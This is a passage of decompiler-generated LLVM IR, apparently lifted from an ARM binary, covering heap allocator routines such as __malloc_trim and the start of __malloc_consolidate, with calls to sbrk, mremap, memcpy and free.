  %v2_129a8 = sub i32 %v0_129bc, %v0_129a8
  store i32 %v2_129a8, i32* %r1.global-to-local, align 4
  %v0_129b0 = load i32, i32* @sl, align 4
  %v1_129b0 = add i32 %v0_129b0, 4
  %v2_129b0 = inttoptr i32 %v1_129b0 to i32*
  %v3_129b0 = load i32, i32* %v2_129b0, align 4
  %tmp41 = icmp ugt i32 %v2_129a8, 15
  %v1_129d8 = urem i32 %v3_129b0, 2
  store i32 %v1_129d8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_129d8, label %dec_label_pc_129b8

dec_label_pc_129b8:                               ; preds = %dec_label_pc_129a8
  %v2_129bc = or i32 %v1_129d8, %v0_129bc
  store i32 %v2_129bc, i32* %r3.global-to-local, align 4
  store i32 %v2_129bc, i32* %v2_129b0, align 4
  %v0_129c4 = load i32, i32* @sl, align 4
  %v1_129c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_129c4 = add i32 %v1_129c4, %v0_129c4
  store i32 %v2_129c4, i32* %r2.global-to-local, align 4
  %v1_129c8 = add i32 %v2_129c4, 4
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  %v1_129cc = or i32 %v3_129c8, 1
  store i32 %v1_129cc, i32* %r3.global-to-local, align 4
  store i32 %v1_129cc, i32* %v2_129c8, align 4
  br label %dec_label_pc_12a08

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129a8
  %v2_129dc = add i32 %v0_129b0, %v0_129a8
  store i32 %v2_129dc, i32* %r0.global-to-local, align 4
  %v2_129e0 = or i32 %v1_129d8, %v0_129a8
  store i32 %v2_129e0, i32* %r3.global-to-local, align 4
  %v1_129e4 = or i32 %v2_129a8, 1
  store i32 %v1_129e4, i32* %r2.global-to-local, align 4
  store i32 %v2_129e0, i32* %v2_129b0, align 4
  %v0_129ec = load i32, i32* %r2.global-to-local, align 4
  %v1_129ec = load i32, i32* %r0.global-to-local, align 4
  %v2_129ec = add i32 %v1_129ec, 4
  %v3_129ec = inttoptr i32 %v2_129ec to i32*
  store i32 %v0_129ec, i32* %v3_129ec, align 4
  %v0_129f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_129f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_129f0 = add i32 %v1_129f0, %v0_129f0
  store i32 %v2_129f0, i32* %r2.global-to-local, align 4
  %v1_129f4 = add i32 %v2_129f0, 4
  %v2_129f4 = inttoptr i32 %v1_129f4 to i32*
  %v3_129f4 = load i32, i32* %v2_129f4, align 4
  %v1_129f8 = or i32 %v3_129f4, 1
  store i32 %v1_129f8, i32* %r3.global-to-local, align 4
  store i32 %v1_129f8, i32* %v2_129f4, align 4
  %v0_12a00 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a00 = add i32 %v0_12a00, 8
  store i32 %v1_12a00, i32* @r0, align 4
  %v0_12a04 = call i32 @free()
  store i32 %v0_12a04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129b8, %dec_label_pc_129d8
  %v0_12a08 = load i32, i32* @sl, align 4
  %v1_12a08 = add i32 %v0_12a08, 8
  store i32 %v1_12a08, i32* @r4, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12a10:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_12a18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12a18, i32* @r8, align 4
  %v2_12a1c = inttoptr i32 %v1_1282c to i32*
  %v3_12a1c = load i32, i32* %v2_12a1c, align 4
  store i32 %v3_12a1c, i32* @r4, align 4
  %v1_12a20 = add i32 %v4_12a18, 860
  %v2_12a20 = inttoptr i32 %v1_12a20 to i32*
  %v3_12a20 = load i32, i32* %v2_12a20, align 4
  %v1_12a24 = add i32 %v3_12a1c, 4
  %v1_12a28 = add i32 %v3_12a20, -1
  store i32 %v1_12a28, i32* %r2.global-to-local, align 4
  %v2_12a2c = add i32 %v1_12a24, %v1_12a28
  %v1_12a30 = load i32, i32* @sb, align 4
  %v2_12a30 = add i32 %v2_12a2c, %v1_12a30
  store i32 %v2_12a30, i32* %r3.global-to-local, align 4
  %v2_12a34 = sub i32 0, %v3_12a20
  %v3_12a34 = and i32 %v2_12a30, %v2_12a34
  store i32 %v3_12a34, i32* @r7, align 4
  %v2_12a38 = sub i32 %v3_12a34, %v3_12a1c
  store i32 %v2_12a38, i32* @fp, align 4
  %v9_12a3c = icmp eq i32 %v1_12830, %v2_12a38
  br i1 %v9_12a3c, label %dec_label_pc_12ab0, label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a10
  %v2_12a44 = sub i32 %v1_1282c, %v3_12a1c
  store i32 %v2_12a44, i32* %r0.global-to-local, align 4
  %v2_12a48 = add i32 %v3_12a1c, %v1_12830
  store i32 %v2_12a48, i32* %r1.global-to-local, align 4
  store i32 %v3_12a34, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12a54 = call i32 @mremap(i32 %v2_12a44, i32 %v2_12a48, i32 %v3_12a34, i32 1)
  store i32 %v4_12a54, i32* %r0.global-to-local, align 4
  %v7_12a58 = icmp eq i32 %v4_12a54, -1
  br i1 %v7_12a58, label %dec_label_pc_12aa4, label %dec_label_pc_12a60

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a44
  %v1_12a60 = load i32, i32* @r4, align 4
  %v2_12a60 = add i32 %v1_12a60, %v4_12a54
  store i32 %v2_12a60, i32* %r0.global-to-local, align 4
  %v0_12a64 = load i32, i32* @fp, align 4
  %v1_12a64 = or i32 %v0_12a64, 2
  store i32 %v1_12a64, i32* %r3.global-to-local, align 4
  %v2_12a68 = add i32 %v2_12a60, 4
  %v3_12a68 = inttoptr i32 %v2_12a68 to i32*
  store i32 %v1_12a64, i32* %v3_12a68, align 4
  %v0_12a6c = load i32, i32* @r8, align 4
  %v1_12a6c = add i32 %v0_12a6c, 868
  %v2_12a6c = inttoptr i32 %v1_12a6c to i32*
  %v3_12a6c = load i32, i32* %v2_12a6c, align 4
  store i32 %v3_12a6c, i32* %r3.global-to-local, align 4
  %v1_12a70 = add i32 %v0_12a6c, 880
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %r2.global-to-local, align 4
  %v0_12a74 = load i32, i32* @r6, align 4
  %v2_12a74 = sub i32 %v3_12a6c, %v0_12a74
  store i32 %v2_12a74, i32* %r3.global-to-local, align 4
  %v1_12a78 = load i32, i32* @r7, align 4
  %v2_12a78 = add i32 %v1_12a78, %v2_12a74
  store i32 %v2_12a78, i32* %r1.global-to-local, align 4
  %v1_12a7c = add i32 %v0_12a6c, 872
  %v2_12a7c = inttoptr i32 %v1_12a7c to i32*
  %v3_12a7c = load i32, i32* %v2_12a7c, align 4
  store i32 %v3_12a7c, i32* %r3.global-to-local, align 4
  %v1_12a84 = add i32 %v0_12a6c, 884
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  store i32 %v3_12a84, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12a78, %v3_12a70
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12a60
  store i32 %v2_12a78, i32* %v2_12a70, align 4
  %v0_12a8c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12a8c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12a60, %bb33
  %v1_12a8c = phi i32 [ %v0_12a6c, %dec_label_pc_12a60 ], [ %v1_12a8c.pre, %bb33 ]
  %v0_12a8c = phi i32 [ %v2_12a78, %dec_label_pc_12a60 ], [ %v0_12a8c.pre, %bb33 ]
  %v2_12a8c = add i32 %v1_12a8c, 868
  %v3_12a8c = inttoptr i32 %v2_12a8c to i32*
  store i32 %v0_12a8c, i32* %v3_12a8c, align 4
  %v0_12a90 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a90 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a90 = add i32 %v1_12a90, %v0_12a90
  store i32 %v2_12a90, i32* %r1.global-to-local, align 4
  %v1_12a94 = load i32, i32* %r2.global-to-local, align 4
  %v0_12a98 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a98 = add i32 %v0_12a98, 8
  store i32 %v1_12a98, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12a90, %v1_12a94
  br i1 %tmp43, label %bb35, label %dec_label_pc_12adc

bb35:                                             ; preds = %bb34
  %v5_12a9c = load i32, i32* @r8, align 4
  %v6_12a9c = add i32 %v5_12a9c, 884
  %v7_12a9c = inttoptr i32 %v6_12a9c to i32*
  store i32 %v2_12a90, i32* %v7_12a9c, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12aa4:                               ; preds = %dec_label_pc_12a44
  %v0_12aa4 = load i32, i32* @sb, align 4
  %v1_12aa4 = add i32 %v0_12aa4, 4
  store i32 %v1_12aa4, i32* %r3.global-to-local, align 4
  %v0_12aa8 = load i32, i32* @r6, align 4
  %v3_12aa8 = icmp ult i32 %v0_12aa8, %v1_12aa4
  br i1 %v3_12aa8, label %dec_label_pc_12ab8, label %dec_label_pc_12aa4.dec_label_pc_12ab0_crit_edge

dec_label_pc_12aa4.dec_label_pc_12ab0_crit_edge:  ; preds = %dec_label_pc_12aa4
  %v0_12ab0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12aa4.dec_label_pc_12ab0_crit_edge, %dec_label_pc_12a10
  %v0_12ab0 = phi i32 [ %v0_12ab0.pre, %dec_label_pc_12aa4.dec_label_pc_12ab0_crit_edge ], [ %v0_12818, %dec_label_pc_12a10 ]
  store i32 %v0_12ab0, i32* @r4, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12aa4
  %v1_12ab8 = add i32 %v0_12aa4, -7
  store i32 %v1_12ab8, i32* @r0, align 4
  %v0_12abc = call i32 @malloc()
  store i32 %v0_12abc, i32* @r0, align 4
  store i32 %v0_12abc, i32* @r4, align 4
  %v2_12ac0 = icmp eq i32 %v0_12abc, 0
  br i1 %v2_12ac0, label %dec_label_pc_12adc, label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12ab8
  %v0_12ac8 = load i32, i32* @r6, align 4
  %v1_12ac8 = add i32 %v0_12ac8, -8
  store i32 %v1_12ac8, i32* @r2, align 4
  %v0_12acc = load i32, i32* @r5, align 4
  store i32 %v0_12acc, i32* @r1, align 4
  %v0_12ad0 = call i32 @memcpy()
  %v0_12ad4 = load i32, i32* @r5, align 4
  store i32 %v0_12ad4, i32* @r0, align 4
  %v0_12ad8 = call i32 @free()
  store i32 %v0_12ad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12ab8, %dec_label_pc_12ab0, %dec_label_pc_12a08, %.thread6, %dec_label_pc_12878, %dec_label_pc_12ac8
  store i32 %v2_127c4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v4_12aec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12aec)
  br label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_127a0, %dec_label_pc_12788, %dec_label_pc_12adc
  %v0_12af8 = load i32, i32* @r4, align 4
  store i32 %v0_12af8, i32* %r0.global-to-local, align 4
  store i32 %v3_12768, i32* @r4, align 4
  store i32 %v6_12768, i32* @r5, align 4
  store i32 %v9_12768, i32* @r6, align 4
  store i32 %v12_12768, i32* @r7, align 4
  store i32 %v15_12768, i32* @r8, align 4
  store i32 %v18_12768, i32* @sb, align 4
  store i32 %v21_12768, i32* @sl, align 4
  store i32 %v24_12768, i32* @fp, align 4
  store i32 %v27_12768, i32* @lr, align 4
  ret i32 %v0_12af8

; uselistorder directives
  uselistorder i32 %v2_12a90, { 1, 0, 2 }
  uselistorder i32 %v2_12a78, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12a54, { 1, 0, 2 }
  uselistorder i32 %v3_12a34, { 1, 0, 2, 3 }
  uselistorder i32 %v1_129d8, { 2, 1, 0 }
  uselistorder i32 %v2_129a8, { 1, 0, 2 }
  uselistorder i32 %v0_1293c, { 1, 0 }
  uselistorder i32 %v0_128f8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1285c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12854, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12838, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12830, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1282c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1281c, { 1, 0 }
  uselistorder i32 %v0_12818, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_127f0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12af8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12adc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12a08, { 1, 0 }
  uselistorder label %dec_label_pc_129a8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_128f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_128e8, { 1, 0 }
  uselistorder label %dec_label_pc_128e4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12b0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12b0c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12b0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b0c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_12b0c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_12b20.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b20.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_12b24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_12b0c, %bb
  %v4_12b24 = phi i32 [ %v4_12b24.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_12b0c ], [ 0, %bb ]
  ret i32 %v4_12b24

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12b28 = add i32 %arg2, 44
  %v2_12b28 = inttoptr i32 %v1_12b28 to i32*
  %v3_12b28 = load i32, i32* %v2_12b28, align 4
  %v3_12b2c = load i32, i32* @r4, align 4
  store i32 %v3_12b2c, i32* %stack_var_-20, align 4
  %v12_12b2c = load i32, i32* @r7, align 4
  %v1_12b30 = add i32 %v3_12b28, 4
  %v2_12b30 = inttoptr i32 %v1_12b30 to i32*
  %v3_12b30 = load i32, i32* %v2_12b30, align 4
  %v1_12b34 = add i32 %arg2, 860
  %v2_12b34 = inttoptr i32 %v1_12b34 to i32*
  %v3_12b34 = load i32, i32* %v2_12b34, align 4
  store i32 %v3_12b34, i32* @r4, align 4
  %v1_12b38 = and i32 %v3_12b30, -4
  store i32 %v1_12b38, i32* @r6, align 4
  %v1_12b3c = add i32 %v1_12b38, -17
  %v2_12b40 = add i32 %v1_12b3c, %v3_12b34
  store i32 %arg2, i32* @r5, align 4
  %v2_12b4c = sub i32 %v2_12b40, %arg1
  store i32 %v3_12b34, i32* %r1.global-to-local, align 4
  %v2_12b54 = udiv i32 %v2_12b4c, %v3_12b34
  %v1_12b58 = add i32 %v2_12b54, -1
  store i32 %v1_12b58, i32* %r0.global-to-local, align 4
  %v2_12b5c = mul i32 %v1_12b58, %v3_12b34
  store i32 %v2_12b5c, i32* @r7, align 4
  %v2_12b60 = icmp eq i32 %v2_12b5c, 0
  store i1 %v2_12b60, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12b5c, 1
  br i1 %tmp8, label %dec_label_pc_12bc8, label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12b6c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12b6c, i32* %r0.global-to-local, align 4
  %v0_12b70 = load i32, i32* @r5, align 4
  %v1_12b70 = add i32 %v0_12b70, 44
  %v2_12b70 = inttoptr i32 %v1_12b70 to i32*
  %v3_12b70 = load i32, i32* %v2_12b70, align 4
  %v0_12b74 = load i32, i32* @r6, align 4
  %v2_12b74 = add i32 %v0_12b74, %v3_12b70
  %v9_12b78 = icmp eq i32 %v1_12b6c, %v2_12b74
  store i1 %v9_12b78, i1* @cpsr_z, align 1
  store i32 %v1_12b6c, i32* @r4, align 4
  br i1 %v9_12b78, label %dec_label_pc_12b84, label %dec_label_pc_12bc8

dec_label_pc_12b84:                               ; preds = %dec_label_pc_12b68
  %v0_12b84 = load i32, i32* @r7, align 4
  %v1_12b84 = sub i32 0, %v0_12b84
  store i32 %v1_12b84, i32* %r0.global-to-local, align 4
  %v1_12b88 = call i32 @__GI_sbrk(i32 %v1_12b84)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12b90 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12b90, i32* %r0.global-to-local, align 4
  %v7_12b94 = icmp eq i32 %v1_12b90, -1
  store i1 %v7_12b94, i1* @cpsr_z, align 1
  br i1 %v7_12b94, label %dec_label_pc_12bc8, label %dec_label_pc_12b9c

dec_label_pc_12b9c:                               ; preds = %dec_label_pc_12b84
  %v0_12b9c = load i32, i32* @r4, align 4
  %v2_12b9c = sub i32 %v0_12b9c, %v1_12b90
  store i32 %v2_12b9c, i32* %r0.global-to-local, align 4
  %v9_12b9c = icmp eq i32 %v0_12b9c, %v1_12b90
  store i1 %v9_12b9c, i1* @cpsr_z, align 1
  br i1 %v9_12b9c, label %dec_label_pc_12bc8, label %dec_label_pc_12ba4

dec_label_pc_12ba4:                               ; preds = %dec_label_pc_12b9c
  %v0_12ba4 = load i32, i32* @r5, align 4
  %v1_12ba4 = add i32 %v0_12ba4, 872
  %v2_12ba4 = inttoptr i32 %v1_12ba4 to i32*
  %v3_12ba4 = load i32, i32* %v2_12ba4, align 4
  %v1_12ba8 = load i32, i32* @r6, align 4
  %v2_12ba8 = sub i32 %v1_12ba8, %v2_12b9c
  store i32 %v2_12ba8, i32* %r2.global-to-local, align 4
  %v1_12bac = add i32 %v0_12ba4, 44
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  store i32 %v3_12bac, i32* %r1.global-to-local, align 4
  %v2_12bb0 = sub i32 %v3_12ba4, %v2_12b9c
  %v1_12bb4 = or i32 %v2_12ba8, 1
  store i32 %v1_12bb4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12bb0, i32* %v2_12ba4, align 4
  %v0_12bc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bc0 = add i32 %v1_12bc0, 4
  %v3_12bc0 = inttoptr i32 %v2_12bc0 to i32*
  store i32 %v0_12bc0, i32* %v3_12bc0, align 4
  %v1_12bd4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bcc

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12b68, %dec_label_pc_12b9c, %dec_label_pc_12b84, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bcc

dec_label_pc_12bcc:                               ; preds = %dec_label_pc_12ba4, %dec_label_pc_12bc8
  %v1_12bd4 = phi i32 [ %v1_12bd4.pre, %dec_label_pc_12ba4 ], [ 0, %dec_label_pc_12bc8 ]
  %v2_12bd0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12bd0, i32* @r4, align 4
  store i32 %v12_12b2c, i32* @r7, align 4
  ret i32 %v1_12bd4

; uselistorder directives
  uselistorder i1 %v7_12b94, { 1, 0 }
  uselistorder i32 %v1_12b90, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12b34, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12bcc, { 1, 0 }
  uselistorder label %dec_label_pc_12bc8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12bd8 = load i32, i32* @r4, align 4
  store i32 %v3_12bd8, i32* %stack_var_-36, align 4
  %v0_12bdc = load i32, i32* @r0, align 4
  %v1_12bdc = inttoptr i32 %v0_12bdc to i32*
  %v2_12bdc = load i32, i32* %v1_12bdc, align 4
  store i32 %v2_12bdc, i32* %r3.global-to-local, align 4
  %v2_12be0 = icmp eq i32 %v2_12bdc, 0
  store i32 %v0_12bdc, i32* @r4, align 4
  br i1 %v2_12be0, label %dec_label_pc_12d18.preheader, label %dec_label_pc_12bf4

dec_label_pc_12d18.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12d2025 = add i32 %v0_12bdc, 52
  store i32 %v1_12d2025, i32* %r3.global-to-local, align 4
  %v2_12d2826 = add i32 %v0_12bdc, 60
  %v3_12d2827 = inttoptr i32 %v2_12d2826 to i32*
  store i32 %v1_12d2025, i32* %v3_12d2827, align 4
  %v0_12d2c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_12d2c29 = add i32 %v0_12d2c28, 12
  %v3_12d2c30 = inttoptr i32 %v2_12d2c29 to i32*
  store i32 %v0_12d2c28, i32* %v3_12d2c30, align 4
  br label %dec_label_pc_12d18.dec_label_pc_12d18_crit_edge

dec_label_pc_12bf4:                               ; preds = %entry
  %v1_12bf4 = and i32 %v2_12bdc, -3
  %v3_12bf8 = udiv i32 %v2_12bdc, 8
  store i32 %v3_12bf8, i32* %r2.global-to-local, align 4
  store i32 %v1_12bf4, i32* %v1_12bdc, align 4
  %v0_12c00 = load i32, i32* @r0, align 4
  %v1_12c00 = add i32 %v0_12c00, -4
  store i32 %v1_12c00, i32* %r3.global-to-local, align 4
  %v1_12c04 = load i32, i32* %r2.global-to-local, align 4
  %v4_12c04 = mul i32 %v1_12c04, 4
  %v5_12c04 = add i32 %v4_12c04, %v1_12c00
  store i32 %v5_12c04, i32* %sb.global-to-local, align 4
  %v1_12c08 = add i32 %v0_12c00, 52
  store i32 %v1_12c08, i32* %r7.global-to-local, align 4
  %v1_12c0c = add i32 %v0_12c00, 4
  store i32 %v1_12c0c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12d10, %dec_label_pc_12bf4
  %v1_12d0810 = phi i32 [ %v1_12d08, %dec_label_pc_12d10 ], [ %v5_12c04, %dec_label_pc_12bf4 ]
  %v1_12c20 = phi i32 [ %v1_12d10, %dec_label_pc_12d10 ], [ %v1_12c0c, %dec_label_pc_12bf4 ]
  %v1_12c14 = inttoptr i32 %v1_12c20 to i32*
  %v2_12c14 = load i32, i32* %v1_12c14, align 4
  store i32 %v2_12c14, i32* %r1.global-to-local, align 4
  %v2_12c18 = icmp eq i32 %v2_12c14, 0
  br i1 %v2_12c18, label %dec_label_pc_12d08, label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c14
  %v0_12c20 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12c20, i32* %v1_12c14, align 4
  %v0_12c24.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c24

dec_label_pc_12c24:                               ; preds = %dec_label_pc_12cfc, %dec_label_pc_12c20
  %v0_12c40 = phi i32 [ %v0_12cfc, %dec_label_pc_12cfc ], [ %v0_12c24.pre, %dec_label_pc_12c20 ]
  %v1_12c24 = add i32 %v0_12c40, 4
  %v2_12c24 = inttoptr i32 %v1_12c24 to i32*
  %v3_12c24 = load i32, i32* %v2_12c24, align 4
  store i32 %v3_12c24, i32* %r3.global-to-local, align 4
  %v1_12c28 = and i32 %v3_12c24, -2
  store i32 %v1_12c28, i32* %lr.global-to-local, align 4
  %v2_12c2c = add i32 %v1_12c28, %v0_12c40
  store i32 %v2_12c2c, i32* @r0, align 4
  %v1_12c30 = urem i32 %v3_12c24, 2
  %v2_12c30 = icmp eq i32 %v1_12c30, 0
  %v1_12c34 = add i32 %v0_12c40, 8
  %v2_12c34 = inttoptr i32 %v1_12c34 to i32*
  %v3_12c34 = load i32, i32* %v2_12c34, align 4
  store i32 %v3_12c34, i32* %sl.global-to-local, align 4
  %v1_12c38 = add i32 %v2_12c2c, 4
  %v2_12c38 = inttoptr i32 %v1_12c38 to i32*
  %v3_12c38 = load i32, i32* %v2_12c38, align 4
  store i32 %v3_12c38, i32* %r8.global-to-local, align 4
  br i1 %v2_12c30, label %dec_label_pc_12c40, label %dec_label_pc_12c74

dec_label_pc_12c40:                               ; preds = %dec_label_pc_12c24
  %v1_12c40 = inttoptr i32 %v0_12c40 to i32*
  %v2_12c40 = load i32, i32* %v1_12c40, align 4
  store i32 %v2_12c40, i32* %r5.global-to-local, align 4
  %v2_12c44 = sub i32 %v0_12c40, %v2_12c40
  store i32 %v2_12c44, i32* %r3.global-to-local, align 4
  %v1_12c48 = add i32 %v2_12c44, 8
  %v2_12c48 = inttoptr i32 %v1_12c48 to i32*
  %v3_12c48 = load i32, i32* %v2_12c48, align 4
  store i32 %v3_12c48, i32* %ip.global-to-local, align 4
  %v1_12c4c = add i32 %v3_12c48, 12
  %v2_12c4c = inttoptr i32 %v1_12c4c to i32*
  %v3_12c4c = load i32, i32* %v2_12c4c, align 4
  store i32 %v3_12c4c, i32* %r1.global-to-local, align 4
  %v9_12c50 = icmp eq i32 %v3_12c4c, %v2_12c44
  %v1_12c54 = add i32 %v2_12c44, 12
  %v2_12c54 = inttoptr i32 %v1_12c54 to i32*
  %v3_12c54 = load i32, i32* %v2_12c54, align 4
  store i32 %v3_12c54, i32* %r2.global-to-local, align 4
  br i1 %v9_12c50, label %dec_label_pc_12c5c, label %dec_label_pc_12cb8

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c40
  %v1_12c5c = add i32 %v3_12c54, 8
  %v2_12c5c = inttoptr i32 %v1_12c5c to i32*
  %v3_12c5c = load i32, i32* %v2_12c5c, align 4
  store i32 %v3_12c5c, i32* %r3.global-to-local, align 4
  %v9_12c60 = icmp eq i32 %v3_12c5c, %v2_12c44
